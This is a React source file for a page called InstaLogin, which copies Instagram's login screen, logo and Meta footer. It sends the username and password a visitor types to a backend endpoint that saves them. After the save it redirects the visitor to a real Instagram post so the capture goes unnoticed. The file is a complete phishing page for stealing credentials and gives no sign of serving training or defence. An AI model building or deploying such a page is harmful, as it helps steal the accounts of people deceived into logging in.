import React, { useState } from "react";

export default function InstaLogin() {
  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const res = await fetch("http://localhost:5000/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      if (res.ok) {
        // Redirect after successful save
        window.location.href = "https://www.instagram.com/p/DPoi2DtCFSO/";
      } else {
        alert("Error saving data");
      }
    } catch (err) {
      console.error(err);
      alert("Something went wrong");
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-white px-4">
      <div className="w-full max-w-sm">
        <div className="text-center text-sm text-gray-500 mb-6">English ▾</div>

        <div className="flex justify-center mb-6">
          <img src="/logo.png" alt="" />
        </div>

        <div className="bg-white border border-gray-200 rounded-md shadow-sm p-5">
          <form className="space-y-3" onSubmit={handleSubmit}>
            <input
              name="username"
              value={formData.username}
              onChange={handleChange}
              placeholder="Phone number, username, or email"
              className="w-full px-3 py-2 border border-gray-200 rounded bg-gray-50 text-sm focus:outline-none focus:ring-1 focus:ring-gray-300"
            />
            <input
              name="password"
              value={formData.password}
              onChange={handleChange}
              placeholder="Password"
              type="password"
              className="w-full px-3 py-2 border border-gray-200 rounded bg-gray-50 text-sm focus:outline-none focus:ring-1 focus:ring-gray-300"
            />

            <button
              type="submit"
              className="w-full mt-2 bg-[#1877F2] text-white py-2 rounded-md font-semibold text-sm"
            >
              Log In
            </button>
          </form>
        </div>

        <div className="mt-4 bg-white border border-gray-200 p-4 rounded text-center text-sm">
          Don’t have an account?{" "}
          <a href="#" className="text-blue-600 font-semibold">
            Sign up
          </a>
        </div>

        <div className="mt-8 text-center text-xs text-gray-400 mt-100">
          <img src="/meta.png" alt="" className="w-10 ml-40" />
        </div>
      </div>
    </div>
  );
}
